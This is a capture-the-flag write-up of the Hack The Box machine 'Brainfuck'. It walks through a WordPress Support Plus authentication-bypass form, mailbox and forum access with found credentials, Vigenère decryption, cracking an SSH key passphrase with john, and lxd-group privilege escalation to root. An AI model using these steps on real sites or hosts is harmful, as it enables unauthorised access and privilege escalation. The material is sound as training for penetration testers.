---
"title": "Hack The Box - Brainfuck"
"date": 2020-07-06
"tags": ["linux", "insane", "smtp", "pop3", "lxd", "wpscan"]
"keywords": ["linux", "insane", "smtp", "pop3", "lxd", "wpscan"]
"categories": ["HackTheBox OSCP-Like"]
"author": "Ghostbyt3"
"description": "Getting User is by decrypting a cipher and getting the private key of user and I did root in unintended way, by using lxd for privilege escalation"
"featured_image": "/img/htb-brainfuck/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox OSCP-Like - Writeup"
---


![Untitled](/img/htb-brainfuck/Untitled.png)

Getting User is by decrypting a cipher and getting the private key of user and I did root in unintended way, by using lxd for privilege escalation

Link: [https://www.hackthebox.eu/home/machines/profile/17](https://www.hackthebox.eu/home/machines/profile/17)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE CAPA USER TOP SASL(PLAIN) PIPELINING RESP-CODES
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: have more post-login listed capabilities LITERAL+ AUTH=PLAINA0001 Pre-login IMAP4rev1 ENABLE LOGIN-REFERRALS SASL-IR IDLE ID OK
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTPS Enumeration

Added the Domains which I got from nmap scan in `/etc/host` and started with `brainfuck.htb` and there is no Port 80 (HTTP) but HTTPS is there.

So its an wordpress site.

![Untitled](/img/htb-brainfuck/Untitled%201.png)

I checked the certificate of the webpage and found a valid mail id, since there is SMTP,POP3 we can use this.

![Untitled](/img/htb-brainfuck/Untitled%202.png)

I ran `wpscan` on the website and found an old plugin and also 2 valid users.

```bash
root@kali:~/CTF/HTB/Boxes/Brainfuck# wpscan --url https://brainfuck.htb --disable-tls-check
.
.
.
.
[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 [========================================](========================================) (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Immediately I searched if there is any exploit available for this Plugin and found a good match

> [https://www.exploit-db.com/exploits/41006](https://www.exploit-db.com/exploits/41006)

So According to the exploit due to incorrect  usage of `wp_set_auth_cookie` we can login without the password.

```html
root@kali:~/CTF/HTB/Boxes/Brainfuck# cat ticket.html 
[form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php"](form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php")
	Username: [input type="text" name="username" value="administrator"](input type="text" name="username" value="administrator")
	[input type="hidden" name="email" value="sth"](input type="hidden" name="email" value="sth")
	[input type="hidden" name="action" value="loginGuestFacebook"](input type="hidden" name="action" value="loginGuestFacebook")
	[input type="submit" value="Login"](input type="submit" value="Login")
[/form](/form)
```

First I tried with `administrator` 

![Untitled](/img/htb-brainfuck/Untitled%203.png)

And refresh the main page and Im logged in as `Administrator`, but nothing seems interesting here.

![Untitled](/img/htb-brainfuck/Untitled%204.png)

I tried same with user `admin` now I got something different.

![Untitled](/img/htb-brainfuck/Untitled%205.png)

I went into the settings and found the `SMTP` plugin while checking that, I got the password of the same user `orestis` we got from the certificate.
Eventhough the password is masked by inspecting the element of that I can see the password.
![Untitled](/img/htb-brainfuck/Untitled%206.png)

## SMTP Enumeration

Since I got SMTP password and we know port 110 SMTP is open already, so I connected using telnet and give the details to login and there is 2 mails, I checked them one by one.

```bash
root@kali:~# telnet 10.10.10.17 110
Trying 10.10.10.17...
Connected to 10.10.10.17.
Escape character is '^]'.
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
LIST
+OK 3 messages:
1 977
2 514
.
RETR 1
+OK 977 octets
Return-Path: [www-data@brainfuck.htb](www-data@brainfuck.htb)
X-Original-To: orestis@brainfuck.htb
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 33)
	id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: New WordPress Site
X-PHP-Originating-Script: 33:class-phpmailer.php
Date: Mon, 17 Apr 2017 17:15:40 +0000
From: WordPress [wordpress@brainfuck.htb](wordpress@brainfuck.htb)
Message-ID: [00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb](00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb)
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

https://brainfuck.htb

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during the install.
Log in here: https://brainfuck.htb/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/
.
RETR 2
+OK 514 octets
Return-Path: [root@brainfuck.htb](root@brainfuck.htb)
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: [20170429101206.4227420AEB@brainfuck](20170429101206.4227420AEB@brainfuck)
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards

```

And I got the password for the `Secret Forum` running in `sup3rs3cr3t.brainfuck.htb`

`sup3rs3cr3t.brainfuck.htb` Found login button on the top right.

![Untitled](/img/htb-brainfuck/Untitled%207.png)

Logged in with `orestis : kIEnnfEKJ#9UmdO` 

![Untitled](/img/htb-brainfuck/Untitled%208.png)

I got some new posts now.

![Untitled](/img/htb-brainfuck/Untitled%209.png)

First I checked `SSH Access` and it seems the user `orestis` asking for the ssh password and Password login is disabled so we need of private key to login I guess.

![Untitled](/img/htb-brainfuck/Untitled%2010.png)

The user `orestis` mention `Orestis - Hacking for fun and profit` everytime.

Another Forum is decrypted message.

![Untitled](/img/htb-brainfuck/Untitled%2011.png)

After some tries I understand something that, seems same 

```bash
Qbqquzs - Pnhekxs dpi fca fhf zdmgzt

Orestis - Hacking for fun and profit
```

`mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr` is probably an URL

- `mnvze://` is probably `https://`
- 10.10.10.17 is the IP of the box.
- `sp_ptr` could be `id_rsa`, an often used filename for SSH keys

After some attempts I found that is `Vigenère Cipher`

> [http://rumkin.com/tools/cipher/vigenere.php](http://rumkin.com/tools/cipher/vigenere.php)

I tried with the Quote which the user always use.

![Untitled](/img/htb-brainfuck/Untitled%2012.png)

And I got some sort of key `fuckmybrain` which is repeated always.

## Getting User Shell

By using that I got the url that contains ssh key.

![Untitled](/img/htb-brainfuck/Untitled%2013.png)

Downloaded that to my machine.

![Untitled](/img/htb-brainfuck/Untitled%2014.png)

When I tried to login it asking for passphrase so I use `ssh2john` to make that crack using John.

```bash
root@kali:~/CTF/HTB/Boxes/Brainfuck# python /usr/share/john/ssh2john.py id_rsa > john.priv
root@kali:~/CTF/HTB/Boxes/Brainfuck# john --wordlist=/usr/share/wordlists/rockyou.txt john.priv 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:11 DONE (2020-07-06 18:41) 0.08695g/s 1247Kp/s 1247Kc/s 1247KC/sa6_123..*7¡Vamos!
Session completed
```

And I got the password too.

Now I logged with `orestis : 3poulakia!`

![Untitled](/img/htb-brainfuck/Untitled%2015.png)

## Privilege Escalation

Once I logged in, I checked `id` and It looks like I'm in the group of `lxd`.

```bash
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

Aftere some googling I got these.

> [https://www.exploit-db.com/exploits/46978](https://www.exploit-db.com/exploits/46978)

> [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)

Downloaded that to my machine and build that, it gives me a zip file.

```bash
root@kali:~/CTF/HTB/Boxes/Brainfuck# wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
--2020-07-06 18:52:15--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.156.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.156.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7498 (7.3K) [text/plain]
Saving to: ‘build-alpine’

build-alpine                    100%[=====================================================>]   7.32K  --.-KB/s    in 0.001s  

2020-07-06 18:52:21 (5.10 MB/s) - ‘build-alpine’ saved [7498/7498]

root@kali:~/CTF/HTB/Boxes/Brainfuck# bash build-alpine
Determining the latest release... v3.12
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.2-r0.apk
.
.
.
.
.
.
Executing busybox-initscripts-3.2-r2.post-install
(15/19) Installing scanelf (1.2.6-r0)
(16/19) Installing musl-utils (1.1.24-r9)
(17/19) Installing libc-utils (0.7.2-r3)
(18/19) Installing alpine-keys (2.2-r0)
(19/19) Installing alpine-base (3.12.0-r0)
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB in 19 packages
```

Uploaded that to my machine.

![Untitled](/img/htb-brainfuck/Untitled%2016.png)

And Imported the image to lxc.

![Untitled](/img/htb-brainfuck/Untitled%2017.png)

By checking `/mnt` folder, I found the root directory and got the root flag.

```bash
/ # cd /mnt
/mnt # ls
root
/mnt # cd root/
/mnt/root # ls
bin             dev             home            initrd.img.old  lib64           media           opt             root            sbin            srv             tmp             var             vmlinuz.old
boot            etc             initrd.img      lib             lost+found      mnt             proc            run             snap            sys             usr             vmlinuz
/mnt/root # cd root/
/mnt/root/root # ls
root.txt
```

(Note: There is also Cipher Part to get the root flag, But I used this Unintended Path)

We own the box.